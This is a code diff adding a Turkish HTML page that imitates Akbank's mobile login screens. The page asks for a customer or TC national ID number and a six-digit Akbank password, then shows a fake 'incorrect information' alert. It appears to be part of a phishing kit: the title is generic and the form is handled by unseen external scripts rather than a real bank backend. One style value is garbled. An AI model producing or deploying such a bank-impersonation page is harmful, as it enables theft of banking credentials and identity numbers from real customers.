@@ -1,0 +1,140 @@
+<!DOCTYPE html><html lang="tr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#dc0004">
+    <title>Mobil Sayfa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+   
+ </head>
+<body>
+ 
+    <div class="preloader hidden">
+        <img src="img/ak-white.png" width="115%" style="margin-top: 100%;">
+    </div>
+    <div id="slider">
+        <div class="gray1 slide hidden" style="position:relative;">
+            <h3 id="titles">İyi<br>akşamlar</h3>
+            <section id="buttons2">
+    <button id="btn" onclick="handleButtonClick()">Müşteri veya TC kimlik no ile giriş</button>
+    <button id="btn2" onclick="handleButtonClick()">Kredi kartı numarası ile giriş</button>
+</section>
+
+            <div id="bottom-area" style="
+    bottom: 1px;
+">
+                <div id="flag" style="">
+                    <img src="img/tr.png" width="12%" style="margin-top: 5%;">
+                    <p style="font-size: 12px;">Türkçe</p>
+                </div>
+                <img src="img/bottom.png" class="bottom-fixed">
+            </div>
+
+            <!-- Yeni Buton -->
+           
+        </div>
+
+        <div class="gray2 slide hidden">
+            <div id="bireysel" style="display: inline-flex;width: 100%;justify-content: space-between;">
+                <img id="auto-click" src="img/ok-black.png" onclick="slider1.prev()" width="32px" style="display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    margin-right: 15%;
+                    margin-left: 2%;">
+                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0; margin-right: auto;display: flex;
+                    justify-content: center;
+                    align-items: center;
+                border-bottom: solid red;font-weight: 5mö89n 00;">Bireysel</h2>
+                <h2 style="text-align: center; font-size: 12px; color: black; margin: 0;display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    margin-right: 20%;font-weight: 500;">Kurumsal</h2>
+            </div>
+
+            <h3 id="titles" style="
+    margin-top: 50px;
+">Kredi<br>Başvurusu</h3>
+
+            <section id="buttons2">
+                <button id="btn" onclick="handleButtonClick()">Müşteri veya TC kimlik no ile giriş</button>
+                <button id="btn2">Kredi kartı numarası ile giriş</button>
+            </section>
+
+            <div id="bottom-area">
+                <div id="flag" style="">
+                    <img src="./img/tr.png" width="12%" style="margin-top: 5%;">
+                    <p style="font-size: 12px;">Türkçe</p>
+                </div>
+                <img src="./img/bottom.png" class="bottom-fixed">
+            </div>
+
+            <!-- Yeni Buton -->
+           
+        </div>
+
+        <div class="gray3 slide active" style="background-color: rgb(241, 241, 241);">
+            <div id="tab3header">
+                <img src="./img/ok.png" onclick="slider1.prev()" width="32px" style="margin-right: auto;">
+                <h2 style="text-align: center;font-size: 12px;color: white;margin: 0;margin-right: 47%;font-weight: 600;">
+                    Giriş</h2>
+            </div>
+
+             
+
+            <div id="loginInputs">
+    <form id="customForm" onsubmit="return false;">
+        <label for="customUsername" style="color:#636364; font-size: 11px; display: block;margin-bottom: 3%;float: left;font-weight:600;">MÜŞTERİ
+            VEYA TC KİMLİK NUMARASI</label>
+        <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px;font-weight:600;border:0;width: 100%;display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
+        <hr>
+        <label for="customPassword" style="float: left;color:#636364; font-size: 11px; display: block;margin-bottom: 3%;margin-top: 3%;font-weight:600;">AKBANK
+            ŞİFRESİ</label>
+            <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword"
+       style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;"
+       minlength="6" maxlength="6" inputmode="numeric" autocomplete="current-password">
+    </form> 
+</div>
+
+            <div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
+                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px;font-weight:500;">
+                    Müşteri numaranı mı
+                    <br> <span style="margin-left:-75px !important;">unuttun?</span>
+                </p>
+                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px;font-weight:500;">
+                    Şifreni mi unuttun?
+                </p>
+            </div>
+
+            <div id="submitContainer">
+    <button type="button" id="customSubmitBtn" style="width: 100% !important; background-color: rgb(220, 0, 4);" onclick="submitCustomForm()">Giriş</button>
+</div>
+
+<div id="alertDiv" class="alertDiv" style="">
+    <p style="color: #000; font-size: 12px;font-weight: 600;margin-top:15px;">Bilgilendirme</p>
+    <img src="img/loader.gif" style="width: 30%;">
+    <p style="color: #000; font-size: 12px;font-weight: 400;">Eksik veya hatalı bilgi girdiğini fark ettik.
+        Kontrol edip tekrar deneyebilirsin.</p>
+    <button type="button" onclick="closeAlert()" id="btn-spc3" style="width: 90%!important;">Tamam</button>
+</div>
+
+ 
+            <!-- Yeni Buton -->
+          
+        </div>
+  
+  
+         
+    </div>
+
+ 
+    <script src="script2.js"></script>
+	<script src="ek.js"></script>
+  
+ 
+ 
+</body>
+</html>
